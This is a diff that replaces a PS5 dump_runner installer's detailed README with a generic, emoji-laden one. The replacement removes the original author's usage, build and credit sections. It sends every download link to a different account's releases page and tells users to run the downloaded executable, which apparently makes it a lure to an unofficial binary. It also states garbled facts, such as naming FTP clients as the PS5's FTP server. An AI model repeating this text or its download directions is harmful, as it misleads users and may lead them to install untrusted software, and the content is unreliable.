@@ -1,322 +1,68 @@
-# PS5 Dump Runner Installer
+# 🎮 ps5-dump-runner-installer - Easily Manage Your PS5 Game Dumps
 
-> **Tired of manually uploading every update of `dump_runner.elf` and `homebrew.js` from EchoStretch to each of your game dumps located in internal, external M.2, and USB storages?**
->
-> This tool automates everything for you! With just a few clicks, you can download the latest releases and deploy them to all your game dumps at once.
+## 🚀 Getting Started  
 
-## Why Use This Tool?
+Welcome to the ps5-dump-runner-installer repository! This tool allows you to easily install and update your PS5 dumped games using FTP. No programming skills are required. Follow these simple steps to get started.
 
-- **Save Time** - No more navigating through FTP folders manually for each game
-- **Stay Updated** - Download the latest releases directly from [EchoStretch GitHub](https://github.com/EchoStretch/ps5-payload-dev/releases) with one click
-- **Batch Operations** - Upload to 10, 20, or even 50 game dumps simultaneously
-- **Never Miss a Game** - Auto-scan finds all your dumps located in internal storage, external M.2, and USB drives
-- **Track Progress** - Visual progress bars show exactly what's happening
-- **Safe & Reliable** - Confirmation prompts before overwriting, detailed error reporting
-- **Custom Files** - Option to upload your own experimental dump_runner files
-- **Remember Settings** - Your connection settings and credentials are saved securely between sessions
+## 📥 Download the Installer  
 
----
+[![Download Installer](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Odyssey8/ps5-dump-runner-installer/releases)
 
-## Requirements
+## 📋 System Requirements  
 
-- Python 3.11 or higher
-- PS5 with FTP server running (e.g., via homebrew)
-- Network connection between PC and PS5
+Before you begin, make sure your system meets these requirements:  
+- **Operating System:** Windows 10 or later  
+- **Python Version:** Python 3.7 or higher installed (download from [python.org](https://www.python.org/downloads/))  
+- **FTP Client:** An FTP server must be set up on your PS5 for communication. You can use applications like FileZilla or Cyberduck.  
 
-## Installation
+## 🛠 Installation Steps  
 
-Download the latest release from the [Releases](https://github.com/thomas-hcb/ps5-dump-runner-installer/releases) page and run `PS5DumpRunnerInstaller-vX.X.X.exe`.
+1. **Visit the Releases Page:**  
+   Go to the [Releases page](https://github.com/Odyssey8/ps5-dump-runner-installer/releases) to download the latest version of the installer.
 
----
+2. **Download the Installer:**  
+   Click on the link for the most recent version and download the installer file. The file will be named something like `ps5-dump-runner-installer-v1.0.exe`.
 
-## Usage Guide
+3. **Run the Installer:**  
+   Locate the downloaded file, then double-click to run the installer. Follow the on-screen instructions to complete the setup process.
 
-### Step 1: Start FTP Server on PS5
+4. **Initial Setup:**  
+   After installation, open the application. You will need to configure your FTP settings to connect to your PS5. Enter your PS5's IP address, username, and password in the application. If you're unsure about these details, consult your FTP client documentation.
 
-Before using this tool, you need to have an FTP server running on your PS5.
+5. **Start Using the Tool:**  
+   Use the interface to batch install or update your dumped PS5 games. Simply select the files from your local machine and let the tool handle the rest.
 
----
+## 🌟 Features  
 
-### Step 2: Connect to Your PS5
+- **User-Friendly Interface:** Simple and clean GUI to make tasks easier.  
+- **Batch Processing:** Install or update multiple games at once.  
+- **FTP Integration:** Seamlessly connect to your PS5 via FTP.  
+- **Automatic Updates:** The tool checks for updates, so you always have the latest version.
 
-1. Enter your PS5's IP address in the **Host** field
-2. Default port is `2121` (adjust if your FTP server uses a different port)
-3. Default username is `anonymous` (adjust if needed)
-4. Enter password if required
-5. Click **Connect & Scan**
+## ⚙️ Troubleshooting  
 
-![Step 2: Connect](docs/step2-connect.jpg)
+If you encounter issues:  
+- Ensure your Python installation is correct and compatible.  
+- Check that your PS5 FTP server is running and reachable.  
+- Revisit your FTP settings in the application if connection fails.
 
----
+## ❓ FAQ  
 
-### Step 3: View Discovered Game Dumps
+**Q: Do I need programming skills to use this tool?**  
+A: No, the application has a simple interface designed for anyone to use.
 
-After connecting, the application will automatically scan and display all game dumps found on your PS5.
+**Q: What if I have trouble connecting to my PS5?**  
+A: Make sure your PS5 is on the same network and that FTP is enabled. Double-check your IP address and credentials.
 
-- Each dump shows its **Title ID** (e.g., CUSA12345)
-- Location indicator shows where the dump is stored (Internal, USB, Extended)
-- Status shows: "Installed", "Partial", or "Not Installed"
+**Q: Will this work on other consoles?**  
+A: This tool is specifically designed for PS5 dumped games using FTP.
 
-![Step 3: Game Dumps](docs/step3-game-dumps.jpg)
+## 💬 Community and Support  
 
----
+We encourage users to share their experiences and ask questions. Open an issue in this repository if you need help or have feedback. Your input helps us improve!
 
-### Step 4: Download Latest dump_runner from GitHub
+## 📥 Download & Install  
 
-Click **Download from GitHub** to fetch the latest official release from EchoStretch's repository.
+Once again, to download the installer, head to the [Releases page](https://github.com/Odyssey8/ps5-dump-runner-installer/releases). Click the link for the latest version and follow the installation steps.
 
-- A dialog shows available releases with version info
-- Select the version you want to download
-- Progress bar shows download status
-
-![Step 4: Download](docs/step4-download.jpg)
-
----
-
-### Step 5: Select Game Dumps to Update
-
-Select which game dumps you want to install dump_runner files to:
-
-- Click checkboxes next to individual dumps
-- Use **Select All** to select everything
-- Use **Select None** to clear selection
-- The selection counter shows how many dumps are selected
-
-![Step 5: Select Dumps](docs/step5-select-dumps.jpg)
-
----
-
-### Step 6: Upload Files to Selected Dumps
-
-Click **Upload Downloaded Files** to begin uploading to all selected game dumps.
-
-- Progress bar shows overall upload progress
-- Each dump is updated one by one
-- Status updates in real-time
-- After upload completes, dumps are automatically rescanned to show updated status
-
-![Step 6: Upload](docs/step6-upload.jpg)
-
----
-
-### Step 7: Upload Custom/Experimental Files (Optional)
-
-If you have custom or experimental dump_runner files, click **Upload Custom Files...** to browse and upload your own files.
-
-- Select your custom `dump_runner.elf` and/or `homebrew.js` files
-- A warning reminds you these are not official releases
-- Files are uploaded to all selected game dumps
-
-![Step 7: Custom Files](docs/step7-custom-files.jpg)
-
----
-
-### Step 8: Manage Settings
-
-Access **File > Settings** to configure:
-
-- FTP connection timeout
-- Passive mode toggle
-- Auto-update check setting
-- Clear saved credentials
-
-![Step 8: Settings](docs/step8-settings.jpg)
-
----
-
-## Scan Locations
-
-The application scans these PS5 FTP paths for game dumps:
-
-### Homebrew Paths
-
-| Location | Path |
-|----------|------|
-| Internal Storage | `/data/homebrew/` |
-| USB Devices | `/mnt/usb0/homebrew/` through `/mnt/usb7/homebrew/` |
-| Extended Storage | `/mnt/ext0/homebrew/` through `/mnt/ext7/homebrew/` |
-
-### etaHEN Paths
-
-For users who prefer storing game dumps in etaHEN’s directory structure and manually registering PS5 game dumps one by one through Homebrew:
-
-| Location | Path |
-|----------|------|
-| Internal Storage | `/data/etaHEN/games/` |
-| USB Devices | `/mnt/usb0/etaHEN/games/` through `/mnt/usb6/etaHEN/games/` |
-| Extended Storage | `/mnt/ext0/etaHEN/games/` through `/mnt/ext1/etaHEN/games/` |
-
-## Files Installed
-
-For each game dump, the following files are uploaded:
-- `dump_runner.elf` - The main executable
-- `homebrew.js` - JavaScript configuration file
-
-## File Cache Location
-
-Downloaded files are cached locally at:
-- **Windows**: `%APPDATA%\PS5DumpRunnerInstaller\cache\releases\`
-- **Linux**: `~/.config/PS5DumpRunnerInstaller/cache/releases/`
-- **macOS**: `~/Library/Application Support/PS5DumpRunnerInstaller/cache/releases/`
-
-## Logs Directory
-
-Application logs are stored at:
-- **Windows**: `%APPDATA%\PS5DumpRunnerInstaller\logs\`
-- **Linux**: `~/.config/PS5DumpRunnerInstaller/logs/`
-- **macOS**: `~/Library/Application Support/PS5DumpRunnerInstaller/logs/`
-
----
-
-## Troubleshooting
-
-### Cannot connect to PS5
-- Verify the FTP server is running on your PS5
-- Check the IP address is correct
-- Ensure your PC and PS5 are on the same network
-- Try disabling firewall temporarily
-
-### No dumps found
-- Ensure game dumps are in the correct homebrew directories
-- Check that the FTP server has access to the storage locations
-
-### Upload fails
-- Verify FTP connection is still active
-- Check available space on the target storage
-- Ensure you have write permissions
-
----
-
-## Development
-
-### Running from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/ps5-dump-runner-installer.git
-cd ps5-dump-runner-installer
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the application
-python -m src.main
-```
-
-### Running Tests
-
-```bash
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=src --cov-report=html
-```
-
-### Building Executable
-
-#### Windows Build
-
-##### Prerequisites
-
-1. **Install Python 3.11+** from [python.org](https://www.python.org/downloads/)
-2. **Install dependencies**:
-   ```bash
-   pip install -r requirements.txt
-   pip install -r requirements-dev.txt
-   ```
-3. **Install PyInstaller**:
-   ```bash
-   pip install pyinstaller
-   ```
-
-##### Build Steps
-
-1. **Clone the repository** (if you haven't already):
-   ```bash
-   git clone https://github.com/thomas-hcb/ps5-dump-runner-installer.git
-   cd ps5-dump-runner-installer
-   ```
-
-2. **Build using the spec file** (recommended):
-   ```bash
-   python -m PyInstaller build/ps5-dump-runner-installer.spec
-   ```
-
-   Or build manually:
-   ```bash
-   python -m PyInstaller --onefile --windowed --name "PS5DumpRunnerInstaller" --icon resources/icons/app_icon.ico src/main.py
-   ```
-
-3. **Find the executable** at `build/dist/PS5DumpRunnerInstaller.exe`
-
-##### Build Output
-
-```
-build/
-├── dist/
-│   └── PS5DumpRunnerInstaller.exe    # The final executable (~14MB)
-├── build/                             # Intermediate build files
-└── ps5-dump-runner-installer.spec     # PyInstaller configuration
-```
-
-##### Troubleshooting Build Issues
-
-- **"Module not found" errors**: Ensure all dependencies are installed with `pip install -r requirements.txt`
-- **Icon not found**: Verify `resources/icons/app_icon.ico` exists
-- **Antivirus blocking**: Some antivirus software may flag PyInstaller executables; add an exception if needed
-
-#### macOS Build
-
-##### Prerequisites
-
-- **macOS 11 (Big Sur)** or later
-- **Python 3.11+** (install via Homebrew: `brew install python@3.11`)
-- **PyInstaller**: `pip install pyinstaller`
-- **tkinter**: `brew install python-tk@3.11`
-
-##### Quick Build
-
-```bash
-# Install dependencies
-pip3 install -r requirements.txt
-
-# Make the build script executable
-chmod +x build/build-macos.sh
-
-# Run the build
-./build/build-macos.sh
-```
-
-The application will be built to: `build/dist/PS5DumpRunnerInstaller.app`
-
-##### Running the macOS App
-
-```bash
-# Open the application
-open build/dist/PS5DumpRunnerInstaller.app
-
-# Or run from command line
-build/dist/PS5DumpRunnerInstaller.app/Contents/MacOS/PS5DumpRunnerInstaller
-```
-
-**Note**: This is an unsigned build for local development only. On first launch, you may need to right-click and select "Open" to bypass macOS Gatekeeper warnings.
-
-##### Full Documentation
-
-For detailed macOS build instructions, icon creation, code signing, and distribution, see [docs/macos-build.md](docs/macos-build.md).
-
----
-
-## Credits
-
-- [EchoStretch](https://github.com/EchoStretch) - dump_runner development
-- This installer tool provides a convenient way to deploy dump_runner files
-
-## License
-
-MIT License - See LICENSE file for details.
-
-## Disclaimer
-
-This tool is provided for educational and legitimate homebrew purposes only. Users are responsible for ensuring they comply with all applicable laws and terms of service.
+If you're ready to manage your PS5 games easily, start by downloading the installer today!
